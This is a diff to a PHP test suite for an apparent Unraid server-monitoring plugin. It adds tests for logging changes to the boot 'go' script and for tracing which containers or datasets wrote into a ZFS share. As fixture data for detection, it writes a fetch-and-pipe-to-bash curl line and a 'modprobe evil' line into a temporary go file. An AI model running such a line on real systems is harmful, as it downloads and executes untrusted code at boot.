@@ -7122,6 +7122,8 @@ function testWatchman(): void
     same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
         [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
     $c = $calls();
+    same('watch: go\'s added line kept in its entry (#5)', ['curl -s https://example.com/x | bash'], $by['flash_go']['p']['text'] ?? null);
+    check('watch: go\'s added line never in a notification', !str_contains(implode("\n", $c), 'example.com/x'));
     same('watch: one notification per important kind (ports only in the book), and one for what may belong together (a new address, then rights, plugins, the flash)', 13, count($c));
     check('watch: the chain\'s notification', str_contains(implode("\n", $c), officeNotifyText('watchman', 'notify.chain', ['n' => 12], officeNotifyLang())));
     $lang = officeNotifyLang();
@@ -8072,7 +8074,7 @@ function testWatchmanFlow(): void
         [[$h => 100 * $gb], [], [$h => 40 * $gb], [], [$h => 30 * $gb], [$h => 80 * $gb]],
         [$flow['containers']['kopia']['o'], $flow['containers']['kopia']['h'], $flow['shares']['tank/UnraidSecretaryOffice']['o'],
          $flow['shares']['tank/UnraidSecretaryOffice']['h'], $flow['shares']['tank/data']['h'], $flow['containers']['EmbyServer']['h']]);
-    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while I\'m still learning what is normal',
+    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while I\'m still learning what is normal. Most of it: tank/data itself, not a dataset below it, 30 GB.',
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written'], 'en'), 'en'));
     same('flow: per client and service, the server talking to itself left out', [['192.0.2.7|smb', '192.0.2.9|smb', '192.0.2.7|web'], 61 * $gb, 2 * 1024 ** 2],
         [array_keys($flow['clients']), $flow['totals']['sent']['smb'], $flow['totals']['sent']['web']]);
@@ -8200,6 +8202,214 @@ function testWatchmanFlow(): void
         [isset($f['flow_client']['params']['minutes']), isset($f['flow_client']['params']['usual']), $f['flow_client']['params']['size'] ?? null]);
     @unlink(watchmanLockFile($data, 'book'));
     @unlink(watchmanFlowCountersFile($data));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * go's added lines (#5): their text in the flash_go entry (the first WATCH_GO_SHOW, each cut at WATCH_GO_WIDTH), of removed
+ * lines only their number; never in the entry's words (notification, team lead, SIEM) or the flash mirror
+ */
+function testWatchmanGoLines(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-golines-' . getmypid();
+    @mkdir("$tmp/extra", 0700, true);
+    @mkdir("$tmp/ssh", 0700, true);
+    $paths = ['go' => "$tmp/go", 'extra' => "$tmp/extra", 'passwd' => "$tmp/passwd", 'shadow' => "$tmp/shadow", 'ssh' => "$tmp/ssh"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], "root:*:20000:0:99999:7:::\n");
+    $base = "#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\n";
+    file_put_contents($paths['go'], $base);
+    $known = watchmanFlash($paths);
+    $now = time();
+    $entry = function (string $go) use ($paths, $known, $now): ?array {
+        file_put_contents($paths['go'], $go);
+        $k = $known;
+        $book = [];
+        watchmanFlashCompare($k, watchmanFlash($paths), $book, $now, $paths['go']);
+        return array_column($book, null, 'kind')['flash_go'] ?? null;
+    };
+    $e = $entry($base . "curl -s https://example.com/x | bash\n\n  modprobe evil  \ncurl -s https://example.com/x | bash\n");
+    same('go: lines added — their text (trimmed, a line twice once), the counts', [2, 0, ['curl -s https://example.com/x | bash', 'modprobe evil']],
+        [$e['p']['added'], $e['p']['removed'], $e['p']['text']]);
+    same('go: in words only the counts (the notification, the team lead, the SIEM)', ['added' => 2, 'removed' => 0], watchmanText($e));
+    check('go: the SIEM line without the text', !str_contains(watchmanSyslogLine($e), 'example.com'));
+    $m = watchmanMirror(['book' => [$e], 'baseline' => [], 'state' => []], 'boot', $now, true);
+    check('go: the flash mirror without the text', !str_contains(json_encode($m), 'example.com'));
+    $e = $entry("#!/bin/bash\n/usr/local/sbin/emhttp &\n");
+    same('go: a line removed — only its number, no text', [0, 1, false], [$e['p']['added'], $e['p']['removed'], isset($e['p']['text'])]);
+    $e = $entry("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp -p 8080 &\n");
+    same('go: one line changed — added and removed', [1, 1, ['/usr/local/sbin/emhttp -p 8080 &']], [$e['p']['added'], $e['p']['removed'], $e['p']['text']]);
+    $many = '';
+    foreach (range(1, 25) as $i) {
+        $many .= "echo line $i\n";
+    }
+    $e = $entry($base . $many);
+    same('go: more than ' . WATCH_GO_SHOW . ' added — the first ' . WATCH_GO_SHOW . ' kept, the count says how many', [25, WATCH_GO_SHOW, 'echo line 1', 'echo line 20'],
+        [$e['p']['added'], count($e['p']['text']), $e['p']['text'][0], $e['p']['text'][WATCH_GO_SHOW - 1]]);
+    $long = 'echo ' . str_repeat('ä', 300);
+    $e = $entry($base . $long . "\n" . "printf 'a\tb'\n");
+    same('go: a long line cut, control characters made plain', [WATCH_GO_WIDTH + 1, mb_substr($long, 0, WATCH_GO_WIDTH) . '…', "printf 'a b'"],
+        [mb_strlen($e['p']['text'][0]), $e['p']['text'][0], $e['p']['text'][1]]);
+    @unlink($paths['go']);
+    $k = $known;
+    $book = [];
+    watchmanFlashCompare($k, watchmanFlash($paths), $book, $now, $paths['go']);
+    same('go: the file gone — no text', [true, false], [$book[0]['p']['gone'] ?? null, isset($book[0]['p']['text'])]);
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * Who wrote into a share (#4): per dataset below it from the written counters the watchman reads anyway — Docker's
+ * containers by their writable layer (docker inspect's GraphDriver), new image layers per image (asked of Docker only when
+ * an entry is written, remembered), libvirt's folder, a dataset made in the window («new»), one gone since, a share of one
+ * dataset («no single source»), a non-ZFS disk (never an entry of this kind); in the entry, its details and the notification
+ */
+function testWatchmanFlowSources(): void
+{
+    $gb = 1024 ** 3;
+    same('flow zfs: when a dataset was made', ['w' => 5, 'u' => 6, 's' => null, 'c' => 1791242200],
+        watchmanZfsParse("tank/x\twritten\t5\ntank/x\tused\t6\ntank/x\tcreation\t1791242200\ntank/x\tsnapshots_changed\t-\n")['tank/x']);
+    same('flow libvirt: its image\'s folder in a share, or its folder; anything else none',
+        [['share' => 'system', 'dir' => 'libvirt'], ['share' => 'system', 'dir' => 'libvirt'], ['share' => 'system', 'dir' => ''], null, null, null],
+        [watchmanFlowLibvirt(['IMAGE_FILE' => '/mnt/user/system/libvirt/libvirt.img']), watchmanFlowLibvirt(['IMAGE_FILE' => '/mnt/master/system/libvirt/']),
+         watchmanFlowLibvirt(['IMAGE_FILE' => '/mnt/user/system/libvirt.img']), watchmanFlowLibvirt([]), watchmanFlowLibvirt(['IMAGE_FILE' => '/boot/libvirt.img']),
+         watchmanFlowLibvirt(['IMAGE_FILE' => '/mnt/user/system/../etc/libvirt.img'])]);
+    $hx = fn (string $c) => str_repeat($c, 64);
+    $dockerDs = ['master/system/' . $hx('a') => 'EmbyServer', 'master/system/docker/' . $hx('b') => 'plex'];
+    same('flow sources: the share\'s own, a container (its -init too, also deeper down), a layer of no container, another dataset',
+        ['own', 'ct:EmbyServer', 'ct:EmbyServer', 'ct:plex', 'ly:' . $hx('c'), 'ds:appcache', 'ds:' . $hx('a') . 'x'],
+        [watchmanFlowByKey('master/system', '', $dockerDs), watchmanFlowByKey('master/system', $hx('a'), $dockerDs),
+         watchmanFlowByKey('master/system', $hx('a') . '-init', $dockerDs), watchmanFlowByKey('master/system', 'docker/' . $hx('b') . '-init', $dockerDs),
+         watchmanFlowByKey('master/system', $hx('c'), $dockerDs), watchmanFlowByKey('master/system', 'appcache', $dockerDs),
+         watchmanFlowByKey('master/system', $hx('a') . 'x', $dockerDs)]);
+    $many = [];
+    foreach (range(1, WATCH_FLOW_BY + 5) as $i) {
+        $many["ds:d$i"] = [$i, false];
+    }
+    $m = watchmanFlowByMerge(['ds:d1' => [100, true]], $many);
+    same('flow sources: added up over the pull, new stays new, the smallest into the rest', [WATCH_FLOW_BY, [101, true], [array_sum(range(2, 7)), false]],
+        [count($m), $m['ds:d1'], $m['*']]);
+
+    // Docker's layer database (a fixture): chain ids from the images' diff ids, a shared base layer to the first tagged image
+    $tmp = sys_get_temp_dir() . '/office-tests-flowsrc-' . getmypid();
+    $root = "$tmp/docker";
+    $diff = fn (string $c) => 'sha256:' . $hx($c);
+    $chain2 = fn (string $a, string $b) => hash('sha256', $diff($a) . ' ' . $diff($b));
+    foreach ([$hx('a') => $hx('1'), $chain2('a', 'b') => $hx('2'), $chain2('a', 'c') => $hx('3')] as $chain => $cache) {
+        @mkdir("$root/image/zfs/layerdb/sha256/$chain", 0700, true);
+        file_put_contents("$root/image/zfs/layerdb/sha256/$chain/cache-id", $cache);
+    }
+    $img = fn (string $id, array $tags, array $layers, ?string $top) => 'sha256:' . $hx($id) . "\t" . json_encode($tags) . "\t" . json_encode(array_map($diff, $layers))
+        . "\t" . json_encode($top === null ? null : ['Dataset' => "master/system/$top", 'Mountpoint' => "/var/lib/docker/zfs/graph/$top"]);
+    $inspect = implode("\n", [$img('d', ['dropnook/office:latest'], ['a', 'b'], $hx('2')), $img('e', [], ['a', 'c'], $hx('3')),
+        $img('f', ['alpine:3.20'], ['a'], $hx('1')), $img('9', ['emby/embyserver:4.9'], ['d'], $hx('4')), "broken line"]);
+    same('flow layers: each layer\'s image — a shared base to the first tagged by name, an untagged by its short id, a top layer without the database',
+        [$hx('1') => 'alpine:3.20', $hx('2') => 'dropnook/office', $hx('3') => 'eeeeeeeeeeee', $hx('4') => 'emby/embyserver:4.9'],
+        (function (array $a) { ksort($a); return $a; })(watchmanFlowLayersParse($inspect, $root)));
+    $asks = 0;
+    $ask = function () use (&$asks, $hx): array {
+        $asks++;
+        return [$hx('e') => 'dropnook/office', $hx('f') => 'dropnook/office', $hx('c') => 'alpine'];
+    };
+    $cache = [];
+    $now = time();
+    $r1 = watchmanFlowLayers([$hx('e'), $hx('1')], $ask, $now, $cache);
+    $r2 = watchmanFlowLayers([$hx('f'), $hx('1')], $ask, $now + 60, $cache);
+    $r3 = watchmanFlowLayers([$hx('1')], $ask, $now + WATCH_FLOW_LAYERS_AGAIN, $cache);
+    same('flow layers: asked once, remembered; one no image named asked again only after a while', [1, 'dropnook/office', '', 'dropnook/office', 2],
+        [$r2 === [$hx('f') => 'dropnook/office', $hx('1') => ''] ? 1 : 0, $r1[$hx('e')], $r1[$hx('1')], $r2[$hx('f')], $asks]);
+
+    // rounds: master/system holds Docker (ZFS driver) and libvirt's folder, master/appdata is one dataset, disk1 is XFS
+    $t0 = strtotime('2026-10-05 10:02:00');
+    $old = $t0 - 86400;
+    $ds = fn (int $w, int $u = 0, int $c = 0) => ['w' => $w, 'u' => $u, 's' => null, 'c' => $c ?: $old];
+    $sys = 'master/system/';
+    $round1 = ['master' => $ds(1, 900 * $gb), 'master/system' => $ds($gb, 20 * $gb), $sys . $hx('a') => $ds($gb), $sys . $hx('a') . '-init' => $ds(0),
+        $sys . $hx('b') => $ds(0), $sys . $hx('c') => $ds(5 * $gb), $sys . $hx('d') => $ds($gb), $sys . 'appcache' => $ds(0),
+        'master/appdata' => $ds(0, 100 * $gb), 'master/domains' => $ds(0, 100 * $gb), 'master/domains/Win11' => $ds(0)];
+    $round2 = array_diff_key($round1, [$sys . $hx('d') => 1]) + [$sys . $hx('e') => $ds(2 * $gb, 0, $t0 + 100), $sys . $hx('f') => $ds($gb, 0, $t0 + 150),
+        $sys . $hx('1') => $ds(intdiv($gb, 2), 0, $t0 + 200), $sys . 'renamed' => $ds(50 * $gb)];
+    $round2['master/system'] = $ds(2 * $gb, 20 * $gb);
+    $round2[$sys . $hx('a')] = $ds((int) (4.5 * $gb));
+    $round2[$sys . $hx('b')] = $ds((int) (0.2 * $gb));
+    $round2[$sys . 'appcache'] = $ds((int) (0.25 * $gb));
+    $round2['master/appdata'] = $ds(30 * $gb, 100 * $gb);
+    $round3 = array_diff_key($round2, [$sys . $hx('1') => 1]);
+    $round3[$sys . $hx('a')] = $ds((int) (5.5 * $gb));
+    $layerCache = [];
+    $asks = 0;
+    $layers = function (array $ids) use ($ask, &$layerCache): array {
+        return watchmanFlowLayers($ids, $ask, null, $layerCache);
+    };
+    $look = fn (array $datasets, int $used) => ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null,
+        'kopia' => 'kopia', 'office_shares' => ['UnraidSecretaryOffice'], 'zfs' => ['datasets' => $datasets, 'pools' => ['master'], 'asleep' => []],
+        'docker_ds' => [$sys . $hx('a') => 'EmbyServer', $sys . $hx('b') => 'plex'], 'libvirt' => ['share' => 'system', 'dir' => 'libvirt'],
+        'layers' => $layers,
+        'disks' => ['disks' => ['disk1' => ['fs' => 'xfs', 'used' => $used, 'snap' => null, 'shares' => ['Media']]], 'asleep' => []]];
+    $bf = null;
+    $book = [];
+    [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look($round1, 100 * $gb), $book, $t0);
+    same('flow sources: the first look asks Docker nothing', 0, $asks);
+    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look($round2, 400 * $gb), $book, $t0 + 300);
+    sort($added);
+    same('flow sources: written into the Docker share and the one-dataset share; the XFS disk growing is no such entry', ['flow_written', 'flow_written'], $added);
+    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+    $e = $by['flow_written:master/system'];
+    same('flow sources: the new layers and the new container count (made since the last round), a renamed one not, the vanished one adds nothing',
+        (int) (8.45 * $gb), $e['p']['bytes']);
+    same('flow sources: top 5 — the container, the new layers per image, the share itself (libvirt\'s folder there), unknown new layers, a dataset — and the rest',
+        [['t' => 'ct', 'name' => 'EmbyServer', 'b' => (int) (3.5 * $gb)], ['t' => 'img', 'name' => 'dropnook/office', 'n' => 2, 'b' => 3 * $gb, 'new' => true],
+         ['t' => 'own', 'name' => 'master/system', 'b' => $gb, 'dir' => 'libvirt'], ['t' => 'img', 'name' => '', 'n' => 1, 'b' => intdiv($gb, 2), 'new' => true],
+         ['t' => 'ds', 'name' => 'master/system/appcache', 'b' => (int) (0.25 * $gb)], ['t' => 'rest', 'b' => (int) (8.45 * $gb) - (int) (3.5 * $gb) - 3 * $gb - $gb - intdiv($gb, 2) - (int) (0.25 * $gb)]],
+        $e['p']['src']);
+    same('flow sources: Docker asked once, only for the entry', 1, $asks);
+    same('flow sources: a share of one dataset — no single source', [['t' => 'none', 'b' => 30 * $gb]], $by['flow_written:master/appdata']['p']['src']);
+    same('flow sources: the entry in words, the biggest source named',
+        '8.4 GB written into master/system in 5 min — 42 % of the share while I\'m still learning what is normal. Most of it: Container EmbyServer (its writable layer), 3.5 GB.',
+        officeNotifyText('watchman', 'entry.flow_written', watchmanText($e, 'en'), 'en'));
+    same('flow sources: no single source, in words (German)',
+        '30 GB geschrieben in master/appdata in 5 Min. — 30 % des Shares, während ich noch lerne, was normal ist. Keine einzelne Quelle sichtbar — master/appdata ist ein einziges Dataset.',
+        officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written:master/appdata'], 'de'), 'de'));
+
+    // five minutes on: the container writes on, the unknown layer is deleted meanwhile
+    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look($round3, 400 * $gb), $book, $t0 + 600);
+    $e = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_written:master/system'];
+    same('flow sources: the pull going on — the same entry, its sources added up, Docker not asked again', [[], (int) (9.45 * $gb), (int) (4.5 * $gb), 1],
+        [$added, $e['p']['bytes'], $e['p']['src'][0]['b'], $asks]);
+    same('flow sources: in words (German) — new, deleted since, the share itself with libvirt\'s folder, the rest', [
+        'Container EmbyServer (seine beschreibbare Ebene): 4,5 GB',
+        '2 neue Image-Ebenen: Image dropnook/office: 3,0 GB',
+        'master/system selbst, kein Dataset darunter — dort liegt der Ordner system/libvirt von libvirt: 1,0 GB',
+        'neue Image-Ebene: Image unbekannt — inzwischen gelöscht: 512 MB',
+        'Dataset master/system/appcache: 256 MB',
+        'übrige: 205 MB'], array_map(fn ($x) => watchmanFlowSourceLine($x, 'de'), $e['p']['src']));
+    same('flow sources: libvirt in a dataset of its own is named so, the share itself then not',
+        [['t' => 'libvirt', 'name' => 'master/system/libvirt', 'b' => 2], ['t' => 'own', 'name' => 'master/system', 'b' => 1]],
+        watchmanFlowSources(['bytes' => 3, 'by' => ['ds:libvirt' => [2, false], 'own' => [1, false]]], 'master/system',
+            ['datasets' => ['master/system' => true, 'master/system/libvirt' => true], 'libvirt' => ['share' => 'system', 'dir' => 'libvirt']]));
+    same('flow sources: nothing known of the sources (a pull begun before) — none named', null, watchmanFlowSources(['bytes' => 3], 'tank/x', []));
+    same('flow sources: a new container, in words', 'Container web (its writable layer) — new: 1.0 GB',
+        watchmanFlowSourceLine(['t' => 'ct', 'name' => 'web', 'b' => $gb, 'new' => true], 'en'));
+
+    // the notification: a section of sources, one per line; the page gets them in the entry
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBin = getenv('OFFICE_NOTIFY_BIN');
+    $envStamp = getenv('OFFICE_NOTIFY_STAMP');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    putenv("OFFICE_NOTIFY_STAMP=$tmp/stamp");
+    $sent = watchmanNotifySend('flow_written', [$e], 'en');
+    putenv($envBin === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBin");
+    putenv($envStamp === false ? 'OFFICE_NOTIFY_STAMP' : "OFFICE_NOTIFY_STAMP=$envStamp");
+    $args = explode("\x1f", (string) @file_get_contents($notified));
+    $msg = (string) ($args[array_search('-m', $args, true) + 1] ?? '');
+    check('flow sources: the notification lists them, one per line', $sent && str_contains($msg, '\n  Where it was written:\n    – Container EmbyServer (its writable layer): 4.5 GB\n'
+        . '    – 2 new image layers: image dropnook/office: 3.0 GB\n') && str_contains($msg, '    – the rest: 205 MB'), $msg);
+    $none = watchmanEntry('flow_written', 'flow_written:master/appdata', $t0, ['share' => 'master/appdata', 'bytes' => $gb, 'src' => [['t' => 'none', 'b' => $gb]]]);
+    $old = watchmanEntry('flow_written', 'flow_written:tank/x', $t0, ['share' => 'tank/x', 'bytes' => $gb]);
+    same('flow sources: an entry of an older office, and one of a single dataset, in words', ['', ' No single source visible — master/appdata is one dataset.'],
+        [watchmanFlowFrom($old['p'], 'en'), watchmanFlowFrom($none['p'], 'en')]);
     exec('rm -rf ' . escapeshellarg($tmp));
 }
 
@@ -22208,7 +22418,7 @@ SH);
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSleepingPools', 'testSnapshotNames', 'testEmby', 'testEmbyWatch', 'testEmbyImport', 'testOfficeCron', 'testMenuName', 'testSetupListDiff', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testNotifyLayout', 'testCaretakerAcks', 'testAckContent',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testMovedDesk', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testPlgRemove', 'testBackupLetGo', 'testApiGetOffline', 'testSupporterList',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testParityWhy', 'testCleanupVolumes'],
           'hardening' => ['testRequestTypes', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testSnapshotRecord', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim'],
